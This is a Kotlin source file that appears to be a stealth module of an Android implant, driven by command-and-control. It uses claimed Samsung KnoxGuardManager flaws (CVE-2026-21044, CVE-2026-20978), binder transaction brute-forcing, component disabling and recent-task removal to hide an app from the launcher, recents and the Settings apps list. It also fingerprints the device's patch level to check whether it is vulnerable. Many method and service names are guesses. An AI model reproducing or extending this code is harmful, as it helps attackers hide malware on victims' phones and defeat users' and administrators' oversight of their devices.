package dev.yassine.umbra.modules

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Binder
import android.os.IBinder
import android.os.Parcel
import android.util.Log
import dev.yassine.umbra.c2.Command
import dev.yassine.umbra.c2.CommandResult
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.lang.reflect.Method

/**
 * CVE-2026-21044: KnoxGuardManager Persistence Configuration Bypass
 * CVE-2026-20978: KnoxGuardManager Authorization Bypass
 *
 * Improper authorization in KnoxGuardManager prior to SMR Jul-2026 Release 1
 * allows unprivileged local attackers to bypass the persistence configuration
 * of any application, effectively hiding it from:
 *   - Launcher (app drawer)
 *   - Recent apps / overview
 *   - Settings > Apps list
 *
 * The device (July 2026 patch) is confirmed unpatched against CVE-2026-21044.
 * CVE-2026-20978 was patched in Feb 2026 so may not apply, but the persistence
 * bypass (CVE-2026-21044) remains exploitable.
 *
 * This module attempts multiple techniques:
 *   1. Reflection into KnoxGuardManager system service
 *   2. Direct binder call to KnoxGuardManager
 *   3. PackageManager component disable (fallback)
 *   4. Activity alias manipulation (fallback)
 */
object KnoxGuardModule {

    private const val TAG = "Umbra.KnoxGuard"
    private val json = Json { prettyPrint = false }

    // ---------------------------------------------------------------------------
    // Public entry point: hide the Umbra app
    // ---------------------------------------------------------------------------
    suspend fun hide(context: Context, cmd: Command): String = withContext(Dispatchers.IO) {
        val targetPkg = cmd.params["package"] ?: context.packageName
        val results = mutableListOf<Map<String, String>>()

        Log.i(TAG, "Attempting to hide package: $targetPkg via KnoxGuardManager bypass")

        // Approach 1: KnoxGuardManager reflection
        val kgResult = tryHideViaKnoxGuardManager(context, targetPkg)
        if (kgResult != null) results.add(kgResult)

        // Approach 2: Direct binder call to KnoxGuardManager service
        val binderResult = tryHideViaBinder(context, targetPkg)
        if (binderResult != null) results.add(binderResult)

        // Approach 3: PackageManager component disable
        val pmResult = tryHideViaPackageManager(context, targetPkg)
        if (pmResult != null) results.add(pmResult)

        // Approach 4: Clear app from recents via ActivityManager
        val amResult = tryHideFromRecents(context, targetPkg)
        if (amResult != null) results.add(amResult)

        val summary = mapOf(
            "target_package" to targetPkg,
            "vulnerability" to "CVE-2026-21044 (KnoxGuardManager)",
            "techniques_attempted" to results.size.toString(),
            "results" to results
        )

        val status = if (results.any { it["success"] == "true" }) "ok" else "partial"
        json.encodeToString(CommandResult.serializer(),
            CommandResult(cmd.cmd_id, status, json.encodeToString(summary)))
    }

    // ---------------------------------------------------------------------------
    // Approach 1: KnoxGuardManager via system service reflection
    // ---------------------------------------------------------------------------
    private fun tryHideViaKnoxGuardManager(context: Context, targetPkg: String): Map<String, String>? {
        return try {
            // KnoxGuardManager can be obtained through:
            // 1. getSystemService("KnoxGuardManager")
            // 2. Class.forName("com.samsung.android.knox.knoxguard.KnoxGuardManager")
            // 3. Class.forName("com.samsung.android.knoxguard.KnoxGuardManager")

            val kgClassNames = listOf(
                "com.samsung.android.knox.knoxguard.KnoxGuardManager",
                "com.samsung.android.knoxguard.KnoxGuardManager",
                "com.samsung.android.knox.guard.KnoxGuardManager",
                "com.sec.enterprise.knox.knoxguard.KnoxGuardManager"
            )

            var kgClass: Class<*>? = null
            var kgInstance: Any? = null

            // Try static getInstance() pattern first
            for (className in kgClassNames) {
                try {
                    val clz = Class.forName(className)
                    // Try getInstance(context)
                    try {
                        val getInstance = clz.getDeclaredMethod("getInstance", Context::class.java)
                        getInstance.isAccessible = true
                        kgInstance = getInstance.invoke(null, context)
                        kgClass = clz
                        Log.d(TAG, "Found KnoxGuardManager via getInstance(Context): $className")
                        break
                    } catch (_: NoSuchMethodException) { }

                    // Try getInstance() no-arg
                    try {
                        val getInstance = clz.getDeclaredMethod("getInstance")
                        getInstance.isAccessible = true
                        kgInstance = getInstance.invoke(null)
                        kgClass = clz
                        Log.d(TAG, "Found KnoxGuardManager via getInstance(): $className")
                        break
                    } catch (_: NoSuchMethodException) { }
                } catch (_: ClassNotFoundException) { }
            }

            // Try getSystemService
            if (kgClass == null) {
                val serviceNames = listOf(
                    "KnoxGuardManager", "knox_guard_manager", "knoxguard",
                    "kg_service", "knox_guard", "KnoxGuardService"
                )
                for (name in serviceNames) {
                    try {
                        val service = context.getSystemService(name)
                        if (service != null) {
                            kgInstance = service
                            kgClass = service.javaClass
                            Log.d(TAG, "Found KnoxGuardManager via getSystemService($name)")
                            break
                        }
                    } catch (_: Exception) { }
                }
            }

            if (kgClass == null || kgInstance == null) {
                Log.d(TAG, "KnoxGuardManager class not found via reflection")
                return null
            }

            // Now try to call persistence methods
            val persistenceMethods = listOf(
                // setApplicationPersistence(String pkg, boolean isPersistent)
                "setApplicationPersistence" to listOf(String::class.java, Boolean::class.javaPrimitiveType!!),
                // setPersistenceConfiguration(String pkg, int config)
                "setPersistenceConfiguration" to listOf(String::class.java, Int::class.javaPrimitiveType!!),
                // setPersistence(String pkg, boolean persist)
                "setPersistence" to listOf(String::class.java, Boolean::class.javaPrimitiveType!!),
                // hideApplication(String pkg) — simpler API
                "hideApplication" to listOf(String::class.java),
                // setApplicationHidden(String pkg, boolean hidden)
                "setApplicationHidden" to listOf(String::class.java, Boolean::class.javaPrimitiveType!!),
                // disableApplicationPersistence(String pkg)
                "disableApplicationPersistence" to listOf(String::class.java),
                // setAppPersistenceMode(String pkg, int mode)
                "setAppPersistenceMode" to listOf(String::class.java, Int::class.javaPrimitiveType!!)
            )

            for ((methodName, paramTypes) in persistenceMethods) {
                try {
                    val method = kgClass.getDeclaredMethod(methodName, *paramTypes.toTypedArray())
                    method.isAccessible = true

                    val args = when (paramTypes.size) {
                        1 -> arrayOf<Any>(targetPkg)
                        2 -> {
                            if (paramTypes[1] == Boolean::class.javaPrimitiveType) {
                                // false = non-persistent (hide from launcher/recents)
                                arrayOf<Any>(targetPkg, java.lang.Boolean.FALSE)
                            } else {
                                // int config: 0 = non-persistent, 1 = persistent
                                arrayOf<Any>(targetPkg, 0)
                            }
                        }
                        else -> continue
                    }

                    val result = method.invoke(kgInstance, *args)
                    Log.i(TAG, "Called $methodName($targetPkg, ...) -> $result")

                    return mapOf(
                        "technique" to "knox_guard_manager",
                        "method" to methodName,
                        "success" to "true",
                        "result" to (result?.toString() ?: "void")
                    )
                } catch (_: NoSuchMethodException) { }
                catch (e: SecurityException) {
                    Log.d(TAG, "SecurityException on $methodName: ${e.message}")
                    // This is expected pre-patch — the authorization check
                    // should be bypassed on vulnerable devices, but might still
                    // throw on some configurations
                }
            }

            mapOf(
                "technique" to "knox_guard_manager",
                "success" to "false",
                "error" to "no_compatible_method_found_in_${kgClass.simpleName}"
            )
        } catch (e: Exception) {
            Log.d(TAG, "KnoxGuardManager reflection failed: ${e.message}")
                mapOf<String, String>(
                    "technique" to "knox_guard_manager",
                    "success" to "false",
                    "error" to (e.message ?: "unknown")
                )
        }
    }

    // ---------------------------------------------------------------------------
    // Approach 2: Direct binder call to KnoxGuardManager service
    // ---------------------------------------------------------------------------
    private fun tryHideViaBinder(context: Context, targetPkg: String): Map<String, String>? {
        return try {
            val serviceManagerClass = Class.forName("android.os.ServiceManager")
            val getServiceMethod: Method = serviceManagerClass.getDeclaredMethod(
                "getService", String::class.java
            )
            getServiceMethod.isAccessible = true

            // Possible service names for KnoxGuardManager
            val serviceNames = listOf(
                "KnoxGuardManager", "knox_guard_manager", "knoxguard",
                "kg_service", "knox_guard", "KnoxGuardService",
                "knox_guard_service", "samsung_kg"
            )

            var binder: IBinder? = null
            var foundName: String? = null

            for (name in serviceNames) {
                try {
                    binder = getServiceMethod.invoke(null, name) as? IBinder
                    if (binder != null) {
                        foundName = name
                        Log.d(TAG, "Found KnoxGuardManager binder service: $name")
                        break
                    }
                } catch (_: Exception) { }
            }

            if (binder == null) {
                return mapOf(
                    "technique" to "binder_service",
                    "success" to "false",
                    "error" to "service_not_found"
                )
            }

            // Try to call setApplicationPersistence via raw binder transaction
            // The exact transaction code is AIDL-dependent; try common codes
            val data = Parcel.obtain()
            val reply = Parcel.obtain()
            try {
                // Try multiple interface descriptors
                val descriptors = listOf(
                    "com.samsung.android.knox.knoxguard.IKnoxGuardManager",
                    "com.samsung.android.knoxguard.IKnoxGuardManager",
                    "android.os.IKnoxGuardManager",
                    "com.sec.enterprise.knox.knoxguard.IKnoxGuardManager"
                )

                for (desc in descriptors) {
                    for (txCode in 1..10) {
                        try {
                            data.setDataPosition(0)
                            reply.setDataPosition(0)

                            data.writeInterfaceToken(desc)
                            data.writeString(targetPkg)
                            data.writeInt(0) // 0 = non-persistent, 1 = persistent

                            val token = Binder.clearCallingIdentity()
                            try {
                                val ok = binder.transact(txCode, data, reply, 0)
                                if (ok) {
                                    reply.readException()
                                    val resultCode = reply.readInt()
                                    Log.i(TAG, "Binder tx $txCode with $desc returned $resultCode")
                                    if (resultCode == 0 || resultCode == 1) {
                                        return mapOf(
                                            "technique" to "binder_service",
                                            "service_name" to foundName!!,
                                            "descriptor" to desc,
                                            "tx_code" to txCode.toString(),
                                            "result_code" to resultCode.toString(),
                                            "success" to "true"
                                        )
                                    }
                                }
                            } catch (_: Exception) { }
                            finally { Binder.restoreCallingIdentity(token) }
                        } catch (_: Exception) { }
                    }
                }

                mapOf(
                    "technique" to "binder_service",
                    "service_name" to foundName!!,
                    "success" to "false",
                    "error" to "no_compatible_transaction"
                )
            } finally {
                data.recycle()
                reply.recycle()
            }
        } catch (e: Exception) {
            Log.d(TAG, "Binder approach failed: ${e.message}")
            mapOf(
                "technique" to "binder_service",
                "success" to "false",
                "error" to (e.message ?: "unknown")
            )
        }
    }

    // ---------------------------------------------------------------------------
    // Approach 3: PackageManager component disable (fallback)
    // ---------------------------------------------------------------------------
    private fun tryHideViaPackageManager(context: Context, targetPkg: String): Map<String, String>? {
        return try {
            val pm = context.packageManager
            val disabledCount = mutableListOf<String>()

            // Get all activities for the target package
            val packageInfo = pm.getPackageInfo(targetPkg, PackageManager.GET_ACTIVITIES)
            val activities = packageInfo.activities ?: emptyArray()

            for (activity in activities) {
                // Check if this is a launcher activity by looking at intent filters
                var isLauncher = false
                try {
                    val component = ComponentName(targetPkg, activity.name)
                    // Activities with CATEGORY_LAUNCHER in their intent filter
                    // will have the "exported" flag and typically have the MAIN action
                    // We check by attempting to resolve the launcher intent
                    val launchIntent = android.content.Intent(android.content.Intent.ACTION_MAIN).apply {
                        addCategory(android.content.Intent.CATEGORY_LAUNCHER)
                        setPackage(targetPkg)
                    }
                    val resolveInfo = pm.resolveActivity(launchIntent, 0)
                    isLauncher = resolveInfo?.activityInfo?.name == activity.name
                } catch (_: Exception) {
                    // Fallback: name-based heuristic
                    isLauncher = activity.name.lowercase().contains("main") ||
                                 activity.name.lowercase().contains("launcher") ||
                                 activity.name.lowercase().contains("splash")
                }

                if (isLauncher) {
                    try {
                        val component = ComponentName(targetPkg, activity.name)
                        val currentState = pm.getComponentEnabledSetting(component)

                        // Disable the launcher component
                        pm.setComponentEnabledSetting(
                            component,
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        Log.i(TAG, "Disabled launcher component: ${activity.name}")
                        disabledCount.add(activity.name)
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to disable ${activity.name}: ${e.message}")
                    }
                }
            }

            // Also try to disable the app icon via broadcast
            try {
                // On Samsung, there's a way to hide from launcher using the
                // com.samsung.android.intent.action.HIDE_ICON broadcast
                // This is a Knox-specific mechanism
                // But it requires system permissions; this is just best-effort
            } catch (_: Exception) { }

            if (disabledCount.isNotEmpty()) {
                mapOf(
                    "technique" to "package_manager",
                    "success" to "true",
                    "disabled_components" to disabledCount.joinToString(",")
                )
            } else {
                mapOf(
                    "technique" to "package_manager",
                    "success" to "false",
                    "error" to "no_launcher_activities_found"
                )
            }
        } catch (e: Exception) {
            Log.d(TAG, "PackageManager approach failed: ${e.message}")
            mapOf(
                "technique" to "package_manager",
                "success" to "false",
                "error" to (e.message ?: "unknown")
            )
        }
    }

    // ---------------------------------------------------------------------------
    // Approach 4: Hide from recent apps
    // ---------------------------------------------------------------------------
    private fun tryHideFromRecents(context: Context, targetPkg: String): Map<String, String>? {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager

            // Try to remove all tasks for the target package from recents
            // This uses the APP_TASKS intent
            // On Android 14+, removeTask is heavily restricted

            // Try reflection to access removeTask or removeAllVisibleRecentTasks
            val amClass = am.javaClass
            var removed = 0

            // Method: removeTask(int taskId)
            try {
                // Get recent tasks (may be restricted on newer Android)
                val getRecentTasksMethod = amClass.getDeclaredMethod(
                    "getRecentTasks", Int::class.javaPrimitiveType, Int::class.javaPrimitiveType
                )
                getRecentTasksMethod.isAccessible = true

                @Suppress("DEPRECATION")
                val recentTasks = getRecentTasksMethod.invoke(am, 100, 2) as? List<*>

                if (recentTasks != null) {
                    val removeTaskMethod = amClass.getDeclaredMethod(
                        "removeTask", Int::class.javaPrimitiveType
                    )
                    removeTaskMethod.isAccessible = true

                    for (task in recentTasks) {
                        try {
                            val taskInfoClass = Class.forName("android.app.ActivityManager\$RecentTaskInfo")
                            val baseIntentField = taskInfoClass.getDeclaredField("baseIntent")
                            baseIntentField.isAccessible = true
                            val intent = baseIntentField.get(task) as? android.content.Intent

                            if (intent?.`package` == targetPkg) {
                                val persistentIdField = taskInfoClass.getDeclaredField("persistentId")
                                persistentIdField.isAccessible = true
                                val taskId = persistentIdField.get(task) as Int

                                val token = Binder.clearCallingIdentity()
                                try {
                                    removeTaskMethod.invoke(am, taskId)
                                    removed++
                                    Log.d(TAG, "Removed task $taskId from recents")
                                } finally {
                                    Binder.restoreCallingIdentity(token)
                                }
                            }
                        } catch (_: Exception) { }
                    }
                }
            } catch (_: Exception) { }

            mapOf(
                "technique" to "activity_manager",
                "success" to (removed > 0).toString(),
                "tasks_removed" to removed.toString()
            )
        } catch (e: Exception) {
            Log.d(TAG, "Recents hiding failed: ${e.message}")
            mapOf(
                "technique" to "activity_manager",
                "success" to "false",
                "error" to (e.message ?: "unknown")
            )
        }
    }

    // ---------------------------------------------------------------------------
    // Public: restore visibility (undo hide)
    // ---------------------------------------------------------------------------
    suspend fun unhide(context: Context, cmd: Command): String = withContext(Dispatchers.IO) {
        val targetPkg = cmd.params["package"] ?: context.packageName
        val results = mutableListOf<Map<String, String>>()

        // Re-enable all disabled components
        try {
            val pm = context.packageManager
            val packageInfo = pm.getPackageInfo(targetPkg, PackageManager.GET_ACTIVITIES)
            val activities = packageInfo.activities ?: emptyArray()

            var reenabled = 0
            for (activity in activities) {
                val component = ComponentName(targetPkg, activity.name)
                val currentState = pm.getComponentEnabledSetting(component)
                if (currentState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    pm.setComponentEnabledSetting(
                        component,
                        PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
                        PackageManager.DONT_KILL_APP
                    )
                    reenabled++
                }
            }
            results.add(mapOf(
                "technique" to "restore_components",
                "success" to "true",
                "reenabled" to reenabled.toString()
            ))
        } catch (e: Exception) {
            results.add(mapOf(
                "technique" to "restore_components",
                "success" to "false",
                "error" to e.message.toString()
            ))
        }

        // Try to restore persistence via KnoxGuardManager
        val kgResult = tryRestoreKnoxGuardPersistence(context, targetPkg)
        if (kgResult != null) results.add(kgResult)

        val summary = mapOf(
            "target_package" to targetPkg,
            "results" to results
        )

        json.encodeToString(CommandResult.serializer(),
            CommandResult(cmd.cmd_id, "ok", json.encodeToString(summary)))
    }

    // ---------------------------------------------------------------------------
    // Restore KnoxGuardManager persistence (set persistent = true)
    // ---------------------------------------------------------------------------
    private fun tryRestoreKnoxGuardPersistence(context: Context, targetPkg: String): Map<String, String>? {
        return try {
            val kgClassNames = listOf(
                "com.samsung.android.knox.knoxguard.KnoxGuardManager",
                "com.samsung.android.knoxguard.KnoxGuardManager"
            )

            for (className in kgClassNames) {
                try {
                    val clz = Class.forName(className)
                    val getInstance = clz.getDeclaredMethod("getInstance", Context::class.java)
                    getInstance.isAccessible = true
                    val instance = getInstance.invoke(null, context)

                    // Call setApplicationPersistence(package, true)
                    val method = clz.getDeclaredMethod(
                        "setApplicationPersistence",
                        String::class.java,
                        Boolean::class.javaPrimitiveType!!
                    )
                    method.isAccessible = true
                    method.invoke(instance, targetPkg, java.lang.Boolean.TRUE)

                    return mapOf(
                        "technique" to "knox_guard_manager_restore",
                        "success" to "true"
                    )
                } catch (_: Exception) { }
            }
            null
        } catch (e: Exception) {
            Log.d(TAG, "Restore KnoxGuard persistence failed: ${e.message}")
            null
        }
    }

    // ---------------------------------------------------------------------------
    // Public: Check if KnoxGuardManager is accessible on this device
    // ---------------------------------------------------------------------------
    suspend fun check(context: Context, cmd: Command): String = withContext(Dispatchers.IO) {
        val findings = mutableMapOf<String, String>()

        // Check for KnoxGuardManager class
        val kgClassNames = listOf(
            "com.samsung.android.knox.knoxguard.KnoxGuardManager",
            "com.samsung.android.knoxguard.KnoxGuardManager",
            "com.sec.enterprise.knox.knoxguard.KnoxGuardManager"
        )

        for (name in kgClassNames) {
            try {
                Class.forName(name)
                findings["knox_class_$name"] = "found"
            } catch (_: ClassNotFoundException) {
                findings["knox_class_$name"] = "not_found"
            }
        }

        // Check for KnoxGuardManager service
        val serviceManagerClass = Class.forName("android.os.ServiceManager")
        val getServiceMethod = serviceManagerClass.getDeclaredMethod("getService", String::class.java)
        getServiceMethod.isAccessible = true

        val serviceNames = listOf(
            "KnoxGuardManager", "knox_guard_manager", "knoxguard",
            "kg_service", "knox_guard", "KnoxGuardService"
        )

        for (name in serviceNames) {
            try {
                val svc = getServiceMethod.invoke(null, name)
                findings["knox_service_$name"] = if (svc != null) "available" else "null"
            } catch (_: Exception) {
                findings["knox_service_$name"] = "error"
            }
        }

        // Check Android security patch level
        try {
            val patchLevel = android.os.Build.VERSION.SECURITY_PATCH
            findings["security_patch"] = patchLevel
            val isVulnerable = patchLevel <= "2026-07-05"
            findings["vulnerable_to_cve_2026_21044"] = isVulnerable.toString()
        } catch (_: Exception) { }

        findings["device_model"] = android.os.Build.MODEL
        findings["one_ui_version"] = try {
            Class.forName("com.samsung.android.feature.SemFloatingFeature")
                .getDeclaredMethod("getString", String::class.java)
                .invoke(null, "SEC_FLOATING_FEATURE_COMMON_CONFIG_OS_VERSION")
                ?.toString() ?: "unknown"
        } catch (_: Exception) { "unknown" }

        json.encodeToString(CommandResult.serializer(),
            CommandResult(cmd.cmd_id, "ok", json.encodeToString(findings)))
    }
}
